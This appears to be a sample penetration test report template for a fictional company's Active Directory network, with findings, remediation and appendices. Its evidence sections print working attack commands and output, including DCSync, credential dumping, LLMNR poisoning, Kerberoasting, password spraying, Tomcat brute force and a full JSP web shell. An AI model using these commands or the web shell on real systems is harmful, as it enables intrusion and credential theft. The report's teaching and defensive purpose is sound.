    "text": "> https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\administrator [DC] 'INLANEFREIGHT.LOCAL' will be the domain [DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server [DC] 'INLANEFREIGHT\\administrator' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) [DC] ms-DS-ReplicationEpoch is: 1 Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : Administrator Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 2/12/2022 9:32:55 PM Object Security ID : S-1-5-21-1666128402-2659679066-1433032234-500 Object Relative ID : 500 Credentials: Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2 Figure 15: Performing the DCSync Attack The tester confirmed this access by authenticating to a Domain Controller in the INLANEFREIGHT.LOCAL domain. $ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2 SMB 192.168.195.204 445 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 192.168.195.204 445 DC01 [+] INLANEFREIGHT.LOCAL\\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2 Figure 16: Authenticating to Domain Controller With this access it was possible to retrieve the NTLM password hashes for all users in the domain. The tester then performed offline cracking of these hashes using the Hashcat tool. A domain password analysis showing several metrics can be found in the appendices of this report. 15\\n$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c::: mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1::: srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0::: pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5c58::: <SNIP> Figure 17: Dumping Domain Credentials 16\\nRemediation Summary As a result of this assessment there are several opportunities for Inlanefreight to strengthen its internal network security. Remediation efforts are prioritized below starting with those that will likely take the least amount of time and effort to complete. Inlanefreight should ensure that all remediation steps and mitigating controls are carefully planned and tested to prevent any service disruptions or loss of data. Short Term  [Finding 2] – Set strong (24+ character) passwords on all SPN accounts  [Finding 5] – Change the default admin credentials for the Tomcat Manager  [Finding 7] – Disable Directory Listing on the affected web server  Enforce a password change for all users because of the domain compromise Medium Term  [Finding 1] – Disable LLMNR and NBT-NS wherever possible  [Finding 2] – Transition from SPNs to Group Managed Service Accounts (gMSA) wherever possible  [Finding 3] – Implement a solution such as the Microsoft Local Administrator Password Solution\" (LAPS)  [Finding 4] – Enhance the domain password policy  [Finding 4] – Consider implementing an enterprise password manager  [Finding 5] – Consider limiting access to the Tomcat Manager to localhost or specific IP Addresses  [Finding 6] – Perform a network file share audit  [Finding 8] – Enhance network logging and monitoring  [Finding 8] – Implement an enterprise endpoint detection & response solution Long Term  Perform ongoing internal network vulnerability assessments and domain password audits  Perform periodic Active Directory security assessments  Educate systems and",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 8
    }
  },
  {
    "text": "a network file share audit  [Finding 8] – Enhance network logging and monitoring  [Finding 8] – Implement an enterprise endpoint detection & response solution Long Term  Perform ongoing internal network vulnerability assessments and domain password audits  Perform periodic Active Directory security assessments  Educate systems and network administrators and developers on security hardening best practices compromise  Enhance network segmentation to isolate critical hosts and limit the effects of an internal compromise 17\\nTechnical Findings Details 1. LLMNR/NBT-NS Response Spoofing - High CWE CWE-522 CVSS 3.1 Score 9.5 By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary-controlled system. This activity may be used to collect or relay authentication materials. Description (Incl. Root Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Cause) Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary-controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary-controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack Security Impact the hashes offline through Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary- controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system relay step can happen in conjunction with poisoning but may also be independent of it. Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder. Affected Domain  INLANEFREIGHT.LOCAL  Disable LLMNR and NetBIOS in local computer security settings or by group policy if they are not needed within an environment  Use host-based security software to block LLMNR/NetBIOS traffic. Enabling SMB Signing can stop NTLMv2 relay attacks. Remediation  Network intrusion detection and prevention systems that can identify traffic patterns indicative of MiTM activity can be used to mitigate activity at the network level.  Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of MiTM activity. External References https://attack.mitre.org/techniques/T1557/001/ Finding Evidence: 18\\nRunning the Responder tool to attempt to obtain user account password hashes. $ sudo responder",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 9
    }
  },
  {
    "text": "level.  Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of MiTM activity. External References https://attack.mitre.org/techniques/T1557/001/ Finding Evidence: 18\\nRunning the Responder tool to attempt to obtain user account password hashes. $ sudo responder -I eth0 -wrfv __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.0.6.0 <SNIP> [+] Generic Options: Responder NIC [eth0] Responder IP [192.168.195.168] Challenge set [random] Don't Respond To Names ['ISATAP'] [+] Current Session Variables: Responder Machine Name [WIN-TWWXTGD94CV] Responder Domain Name [3BKZ.LOCAL] Responder DCE-RPC Port [47032] [+] Listening for events... <SNIP> [SMB] NTLMv2-SSP Client : 192.168.195.205 [SMB] NTLMv2-SSP Username : INLANEFREIGHT\\bsmith [SMB] NTLMv2-SSP Hash : bsmith::INLANEFREIGHT:7ecXXXXXX98ebcigure 18: Running Responder Successfully cracking a password hash with Hashcat to reveal the clear text password value. $ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb 2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a0 02e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00 430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f84 6a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073 002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED> Figure 19: Cracking a Password with Hashcat 19\\n2. Weak Kerberos Authentication (“Kerberoasting”) - High CWE CWE-522 CVSS 3.1 Score 9.5 In an Active Directory (AD) environment, Service Principal Names (SPNs) are used to uniquely identify instances of a Windows service. Kerberos authentication requires that each SPN be associated with one service account (Active Directory user account). Any authenticated AD user can request one or more Kerberos Ticket-Granting Service (TGS) tickets from the domain Description (Incl. Root controller for any SPN accounts. These tickets are encrypted with the associated AD account’s Cause) NTLM password hash. They can be brute forced offline using a password cracking tool such as Hashcat if a weak password is used along with the RC4 encryption algorithm. If AES encryption is in use, it will take more resources to “crack” a ticket to reveal the account’s clear-text password, but it is possible if weak passwords are in use. A successful Kerberoasting attack along with cracked passwords could lead to lateral movement and privilege escalation in an AD environment. If a password is cracked for a Security Impact Domain Administrator account or equivalent, an attacker could gain control over most, if not all, resources in the domain. Affected Domain  INLANEFREIGHT.LOCAL Where possible eliminate SPNs in the environment in favor of Group Managed Service Accounts (gMSA) which are not subject to this type of attack. If migration to gMSAs is not possible the following steps will help mitigate the risk of this attack: Remediation  Enable AES Kerberos encryption instead of RC4  Use strong 25+ character passwords for service accounts and rotate them periodically  Limit the privileges of service accounts and avoid creating SPNs tied to highly privileged accounts such as Domain Administrators External References https://attack.mitre.org/techniques/T1558/003/ Finding Evidence: Retrieving a listing all SPN accounts in the INLANEFREIGHT.LOCAL domain using the GetUserSPNs.py tool from the Impacket toolkit.",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 10
    }
  },
  {
    "text": "for service accounts and rotate them periodically  Limit the privileges of service accounts and avoid creating SPNs tied to highly privileged accounts such as Domain Administrators External References https://attack.mitre.org/techniques/T1558/003/ Finding Evidence: Retrieving a listing all SPN accounts in the INLANEFREIGHT.LOCAL domain using the GetUserSPNs.py tool from the Impacket toolkit. $ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ------------------------------------------- --------- -------- -------------------------- --------- ---- ------ MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> MSSQLSvc/SQL02.inlanefreight.local:1433 sqlprod 2022-05-13 16:54:52.889815 <never> MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 sqldev 2022-05-13 16:54:57.905315 <never> MSSQLSvc/QA001.inlanefreight.local:1433 sqlqa 2022-05-13 16:55:03.421004 <never> backupjob/veam001.inlanefreight.local backupjob 2022-05-13 18:38:17.740269 <never> vmware/vc.inlanefreight.local vmwaresvc 2022-05-13 18:39:10.691799 <never> Figure 20: Kerberoasting - Listing SPN Accounts 20\\nTargeted Kerberoasting against the mssqlsvc account using the GetUserSPNs.py tool. $ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation --------------------------------------- -------- -------- -------------------------- --------- --------- - MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> $krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a39 88485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c 782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3 c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c4 4ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf6828 6ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a8971 85716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP> Figure 21: Targeted Kerberoasting 21\\n3. Local Administrator Password Re-Use - High CWE CWE-522 CVSS 3.1 Score 9.5 Description (Incl. Root All Windows servers in the domain were found to be using the same password for the built-in Cause) local Administrator account. If an attacker can compromise one host in the domain and retrieve the NTLM password hash for the built-in local Administrator account they could use this to access all hosts in the domain Security Impact using this same account, potentially leading to domain compromise or significant sensitive data disclosure. Affected Domain  INLANEFREIGHT.LOCAL Modify local administrator passwords on all affected hosts to be unique values. Consider a solution such as the Microsoft Local Administrator Password Solution (LAPS) to manage local Remediation administrator passwords centrally in Active Directory. This tool mitigates the risk of password re-use by assigning a different machine-generated randomized password to each host that changes automatically on a set interval. https://attack.mitre.org/techniques/T1558/003/ External References https://techcommunity.microsoft.com/t5/itops-talk-blog/step-by-step-guide-how-to- configure-microsoft-local/ba-p/2806185 Finding Evidence: Using the CrackMapExec tool to test for local administrator password re-use. The command below ensures that only one logon attempt is made per host to avoid account lockout. $ sudo crackmapexec smb --local-auth 192.168.195.0/24 -u administrator -H 31d6cfe0dxxxxxxxxxx9d7e0c089c0 | grep + SMB 192.168.195.205 445 MS01 [+] MS01\\administrator 31d6cfe0dxxxxxxxxxx9d7e0c089c0 SMB 192.168.195.220 445 SQL01 [+] SQL01\\administrator 31d6cfe0dxxxxxxxxxx9d7e0c089c0 Figure 22: Testing for Local Admin Password Re-Use 22\\n4. Weak Active Directory Passwords - High CWE CWE-521 CVSS 3.1 Score 9.5 The tester found that users were using common, weak, passwords within the Active Directory Description (Incl. Root domain and was able to uncover passwords for several users via a password spraying attack. Cause) Furthermore, an analysis of all domain passwords after achieving domain compromise showed more widespread weak password usage. An attacker may be able to use this to guess passwords and gain a foothold within the internal environment. If external services are set up with Active Directory authentication (such as VPN, Security Impact email, or remote application services) an attacker may be able to perform a targeted password spray",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 11
    }
  },
  {
    "text": "An attacker may be able to use this to guess passwords and gain a foothold within the internal environment. If external services are set up with Active Directory authentication (such as VPN, Security Impact email, or remote application services) an attacker may be able to perform a targeted password spray to gain internal network access from an anonymous position on the internet.  INLANEFREIGHT.LOCAL Affected Domain See Appendix E – INLANEFREIGHT.LOCAL Domain Password Review for a detailed domain password analysis. Review the password policy and enforce a 12-character minimum password. Consider implementing an enterprise password manager to encourage the use of strong, randomized, Remediation passwords. Implement a password filter to restrict the use of common words such as variations on the words “welcome” and “password”, seasons, months, and variations on the company name. External References https://attack.mitre.org/mitigations/M1027/ Finding Evidence: Performing a password spraying attack against all domain users with the Kerbrute tool and finding two valid passwords. $ $kerbrute passwordspray --dc 192.168.195.204 -d INLANEFREIGHT.LOCAL domain_users.txt <PASSWORD REDACTED> __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,< / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 05/31/22 - Ronnie Flathers @ropnop 2022/05/31 15:55:24 > Using KDC(s): 2022/05/31 15:55:24 > 192.168.195.204:88 2022/05/31 15:55:24 > [+] VALID LOGIN: pramirez@INLANEFREIGHT.LOCAL:<PASSWORD REDACTED> 2022/05/31 15:55:24 > [+] VALID LOGIN: asmith@INLANEFREIGHT.LOCAL:<PASSWORD REDACTED> 2022/05/31 15:55:24 > Done! Tested 1,974 logins (2 successes) in 0.161 seconds Figure 23: Password Spraying – Kerbrute Tool 23\\n5. Tomcat Manager Weak/Default Credentials - High CWE CWE-521 CVSS 3.1 Score 9.5 Description (Incl. Root An Apache Tomcat Server was found that was exposing the Tomcat Manager login URL and Cause) using weak/default credentials to enter the Manager (admin) backend. An attacker who gains access to the Tomcat Manager area can upload a malicious application via a WAR file containing custom JSP code. This code can be used to run arbitrary commands on the underlying server in the context of the service account that the Apache Tomcat instance Security Impact runs under. This Tomcat instance was running under a local service account assigned privileges that can be leveraged to escalate to the all-powerful NT AUTHORITY\\SYSTEM account and gain complete control over the server, potentially gaining access to credentials and other sensitive data. Affected Host(s)  192.168.195.205 (8080/TCP)  Restrict access to the Tomcat Manager URL to either localhost or only select IP addresses if this URL does need to be accessed remotely by administrators.  Change the default administrator account name to something unique and set a strong, Remediation randomized password that does not appear in any wordlists as the Tomcat Manager page uses Basic Authentication, which has no inherent protections against password brute-forcing attacks. External References https://attack.mitre.org/techniques/T1078/001/ Finding Evidence: Setting up the Metasploit auxiliary scanner to brute-force Tomcat manager usernames and passwords. msf6 > use auxiliary/scanner/http/tomcat_mgr_login msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 192.168.195.205 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS true",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 12
    }
  },
  {
    "text": "the Tomcat Manager page uses Basic Authentication, which has no inherent protections against password brute-forcing attacks. External References https://attack.mitre.org/techniques/T1078/001/ Finding Evidence: Setting up the Metasploit auxiliary scanner to brute-force Tomcat manager usernames and passwords. msf6 > use auxiliary/scanner/http/tomcat_mgr_login msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 192.168.195.205 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS true Figure 24: Setting Up Tomcat Login Scanner The tester validated scanner settings before running the tool. 24\\nmsf6 auxiliary(scanner/http/tomcat_mgr_login) > show options Module options (auxiliary/scanner/http/tomcat_mgr_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no The HTTP password to specify for authentication PASS_FILE ../tomcat_mgr_default_pass.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 192.168.195.205 yes The target host(s), range CIDR identifier, or hosts file RPORT 8080 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections STOP_ON_SUCCESS true yes Stop guessing when a credential works for a host TARGETURI /manager/html yes URI for Manager login. Default is /manager/html THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no The HTTP username to specify for authentication USERPASS_FILE ../tomcat_mgr_default_userpass.txt no File containing users and passwords separated by space USER_AS_PASS false no Try the username as the password for all users USER_FILE ../tomcat_mgr_default_users.txt no File containing users, one per line VERBOSE true yes Whether to print output for all attempts VHOST no HTTP server virtual host Figure 25: Checking Scanner Options The tester then ran the Metasploit module to attempt to brute force the Tomcat Manager login credentials and was successful, retrieving the password for the QCC user. msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [!] No active DB -- Credential data will not be saved! [-] 192.168.195.205:8080 - LOGIN FAILED: admin:admin (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: admin:manager (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: admin:role1 (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: admin:root (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: admin:tomcat (Incorrect) <SNIP> [-] 192.168.195.205:8080 - LOGIN FAILED: role1:admin (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: root:owaspbwa (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: xampp:xampp (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect) [+] 192.168.195.205:8080 - Login Successful: QCC:<REDACTED> [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Figure 26: Running the Login Scanner The tester then prepared a JSP web shell to upload to the Tomcat server to achieve remote code execution. 25\\n$ cat cmd.jsp <%@ page import=\"java.util.*,java.io.*\"%> <% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %> <HTML><BODY> <FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"> <INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"> </FORM> <pre> <% if (request.getParameter(\"cmd\") != null) { out.println(\"Command:",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 13
    }
  },
  {
    "text": "achieve remote code execution. 25\\n$ cat cmd.jsp <%@ page import=\"java.util.*,java.io.*\"%> <% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %> <HTML><BODY> <FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"> <INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"> </FORM> <pre> <% if (request.getParameter(\"cmd\") != null) { out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\"); Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML> Figure 27: Contents of JSP Web Shell The web shell was compressed into a WAR archive file which can be deployed as an application via the Tomcat Web Application Manager. $ jar -cvf deploymenttest.war cmd.jsp added manifest adding: cmd.jsp(in = 829) (out= 422)(deflated 49%) Figure 28: Creating a WAR File The tester next logged in to the Tomcat Web Application Manager accessible at the URL http://192.168.195.205:8080/manager/html. 26\\nFigure 29: Logged in to Tomcat Manager Next, the tester uploaded the WAR file created earlier and deployed it as an application via the Tomcat Web Application Manager. Figure 30: Deploying Web Application Figure 31: Web Application Deployed With this web shell in place, the tester was able to run commands on the underlying server. 27\\nFigure 32: Running ipconfig Command From here it would be possible to leverage user account privileges to escalate to the powerful NT AUTHORITY\\SYSTEM account and begin to enumerate the Active Directory domain. Figure 33: Confirming Account Privileges 28\\n6. Insecure File Shares - Medium CWE CWE-284 CVSS 3.1 Score 6.2 Description (Incl. Root The tester uncovered multiple file shares where all Domain Users have read/write access. Cause) An attacker who gains a foothold in this domain can use this access to search for files Security Impact containing sensitive data such as credentials and potentially write malicious files to the file shares. Affected Domain  INLANEFREIGHT.LOCAL Review file share privileges to ensure that users are granted access in accordance with the Remediation principal of least privilege. External References https://attack.mitre.org/techniques/T1135/ Finding Evidence: Viewing file shares accessible to a standard Domain user with the CrackMapExec tool. $ sudo crackmapexec smb 192.168.195.205 -u asmith -p <REDACTED> --shares SMB 192.168.195.205 445 MS01 [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False) SMB 192.168.195.205 445 MS01 [+] INLANEFREIGHT.LOCAL\\asmith:<REDACTED> SMB 192.168.195.205 445 MS01 [+] Enumerated shares SMB 192.168.195.205 445 MS01 Share Permissions Remark SMB 192.168.195.205 445 MS01 ----- ----------- ------ SMB 192.168.195.205 445 MS01 ADMIN$ Remote Admin SMB 192.168.195.205 445 MS01 Backups READ SMB 192.168.195.205 445 MS01 C$ Default share SMB 192.168.195.205 445 MS01 IPC$ READ Remote IPC SMB 192.168.195.205 445 MS01 Migration Data READ SMB 192.168.195.205 445 MS01 Software READ,WRITE Figure 34: Listing Accessible Shares 29\\n7. Directory Listing Enabled - Low CWE CWE-548 CVSS 3.1 Score 4.3 Description (Incl. Root The web application exposes a directory listing of some files in the web root and subfolders. Cause) The severity of this finding depends on the sensitivity of the files exposed on the web",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 14
    }
  },
  {
    "text": "Accessible Shares 29\\n7. Directory Listing Enabled - Low CWE CWE-548 CVSS 3.1 Score 4.3 Description (Incl. Root The web application exposes a directory listing of some files in the web root and subfolders. Cause) The severity of this finding depends on the sensitivity of the files exposed on the web server. If the directory exposes only files intended for public consumption, then the risk is lower but if Security Impact an attacker can gain access to sensitive information such as configuration files, they may be able to use these to gain further access to the application or web server. Affected Host(s)  192.168.195.215 (80/TCP) Restrict access to files and directories based on the concept of least privilege. Enforce Remediation authentication wherever possible and disable directory listing in the web server configuration. https://attack.mitre.org/techniques/T1083/ External References https://www.acunetix.com/blog/articles/directory-listing-information-disclosure/ Finding Evidence: Using a web browser, browsing to the affected host lists the directory contents. Figure 35: Directory Listing 30\\n8. Enhance Security Monitoring Capabilities - Info CWE CWE-693 Description (Incl. Root It appeared that Inlanefreight did not notice “noisy” activities during the course of testing. The Cause) tester was also not blocked when using standard open-source penetration testing tools. If network and endpoint detection and response are inadequate, an attacker who can gain a Security Impact foothold in the internal network may be able to move laterally, perform post-exploitation, and achieve persistence easily. Consider investing in a more advanced network monitoring solution, configuring logging on all hosts, and processing them for anomalies using a SIEM tool, and implementing endpoint detection on each server and workstation that is more difficult to bypass and tamper with. The Remediation organization should not rely on endpoint protection alone. When combined with a defense-in- depth security strategy, they can be an excellent tool for detecting an attacker who gains internal network access and is forced to perform “noisier” and riskier activities to the nature of the hardened environment. External References https://attack.mitre.org/tactics/TA0005/ 31\\nAppendices Appendix A – Finding Severities Each finding has been assigned a severity rating of high, medium, or low. The rating is based off of an assessment of the priority with which each finding should be viewed and the potential impact each has on the confidentiality, integrity, and availability of Inlanefreight’s data. Rating Severity Rating Definition Exploitation of the technical or procedural vulnerability will cause substantial harm. Significant political, financial, and/or legal damage is likely to result. The threat exposure is high, thereby increasing the likelihood of High occurrence. Security controls are not effectively implemented to reduce the severity of impact if the vulnerability were exploited. Exploitation of the technical or procedural vulnerability will significantly impact the confidentiality, integrity, and/or availability of the system, application, or data. Exploitation of the vulnerability may cause moderate financial loss or public embarrassment. The threat exposure is moderate-to-high, thereby increasing the likelihood of occurrence. Security controls are in place to contain the severity of impact if the vulnerability were Medium exploited, such that further political, financial, or legal damage will not occur. -",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 15
    }
  },
  {
    "text": "the vulnerability may cause moderate financial loss or public embarrassment. The threat exposure is moderate-to-high, thereby increasing the likelihood of occurrence. Security controls are in place to contain the severity of impact if the vulnerability were Medium exploited, such that further political, financial, or legal damage will not occur. - OR - The vulnerability is such that it would otherwise be considered High Risk, but the threat exposure is so limited that the likelihood of occurrence is minimal. Exploitation of the technical or procedural vulnerability will cause minimal impact to operations. The Confidentiality, Integrity and Availability (CIA) of sensitive information are not at risk of compromise. Exploitation of the vulnerability may cause slight financial loss or public embarrassment. The threat exposure is moderate-to-low. Security controls are in place to contain the severity of impact if the vulnerability were Low exploited, such that further political, financial, or legal damage will not occur. - OR - The vulnerability is such that it would otherwise be considered Medium Risk, but the threat exposure is so limited that the likelihood of occurrence is minimal. Table 4: Severity Definitions 32\\nAppendix B – Exploited Hosts Host Scope Method Notes 192.168.195.204 (DC01) Internal DCSync Domain compromise 192.168.195.205 (MS01) Internal Credential Theft (Registry) Domain lateral movement 192.168.195.205 (MS01) Internal Tomcat Manger Weak/Default Credentials Alternate domain foothold 192.168.195.220 Internal NBT-NS/LLMNR Response Spoofing/Kerberoasting Initial foothold (SQL01) Table 5: Exploitation Attempt Details 33\\nAppendix C – Compromised Users Username Type Method Notes bsmith Domain NBT-NS/LLMNR Response Spoofing/Kerberoasting Standard Domain User mssqlsvc Domain Kerberoasting Local admin on SQL01 srvadmin Domain Credential Theft (Registry) Local admin on all servers pramirez Domain Credential Theft (Kerberos TGT Ticket) Sysadmin with DCSync rights Table 6: User Accounts Compromised 34\\nAppendix D – Changes/Host Cleanup Host Scope Change/Cleanup needed 192.168.195.205 WAR file in C:\\Program Files (x86)\\Apache Software Foundation\\Tomcat 10.0\\webapps | Internal (MS01) deploymenttest.war | md5sum: db7d6def7d80b8e982f3359875ea54e3 192.168.195.205 JSP file in C:\\Program Files (x86)\\Apache Software Foundation\\Tomcat 10.0\\webapps\\ Internal (MS01) deploymenttest | cmd.jsp | md5sum: 5391c4a8af1ede757ba9d28865e75853 Table 7: Assessment Artifacts 35\\nAppendix E – INLANEFREIGHT.LOCAL Domain Password Review Password Statistics Metric # Total Password Hashes Obtained 2,000 Total Passwords Cracked 1,284 % of Passwords Cracked 64.2 % Number of Domain Admins 12 Cracked Domain Admin Passwords 5 % of Domain Admin Passwords Cracked 42 % Table 8: Password Cracking Statistics Most Commonly Used Passwords Metric # ILFREIGHT# 168 Welcome1 22 Password123 10 Inlanefreight! 8 Spring2022 2 Table 9: Password Reuse Statistics Password Length Breakdown Length # 22 1 15 3 14 13 13 10 12 8 11 27 10 38 9 220 8 897 36\\nLength # 7 67 Table 10: Password Length Statistics 37",
    "metadata": {
